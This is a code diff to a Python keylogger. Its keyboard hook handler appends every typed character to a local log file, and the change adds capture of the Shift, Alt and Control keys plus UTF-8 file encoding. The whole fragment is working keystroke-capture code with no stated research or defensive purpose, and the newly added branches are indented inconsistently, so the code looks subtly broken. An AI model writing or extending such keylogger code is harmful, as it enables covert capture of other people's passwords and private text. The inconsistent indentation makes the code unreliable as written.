@@ -21,11 +21,26 @@ def OnKeyPress(event):
   new_hook.cancel()
  
  elif event.Ascii == 8:  # Check if Backspace key is pressed
-  with open(log_file, 'a') as f: 
+  with open(log_file, 'a', encoding='utf-8') as f: 
     f.write('<backspace>') 
+    
+# Check if Shift key is pressed
+ elif event.Key == 'Shift_L' or event.Key == 'Shift_R':  
+  with open(log_file, 'a', encoding='utf-8') as f: 
+    f.write('<shift>')
+
+# Check if Alt key is pressed
+ elif event.Key == 'Alt_L' or event.Key == 'Alt_R':  
+  with open(log_file, 'a',encoding='utf-8') as f: 
+    f.write('<alt>') 
+
+# Check if Control key is pressed
+ elif event.Key == 'Control_L' or event.Key == 'Control_R':  
+    with open(log_file, 'a',encoding='utf-8') as f: 
+     f.write('<control>')
  
  else: 
-  with open(log_file, 'a') as f: 
+  with open(log_file, 'a', encoding='utf-8') as f: 
    f.write(chr(event.Ascii)) 
 
 # create a hook manager object
@@ -40,6 +55,6 @@ except KeyboardInterrupt:
 	# User cancelled from command line. 
 	pass
 except Exception as ex:  
-	msg = "Error while catching events:\n {}".format(ex) 
+	msg = "Error while catching events:\n{}".format(ex) 
 	with open(log_file, 'a') as f: 
 		f.write("\n{}".format(msg)) 
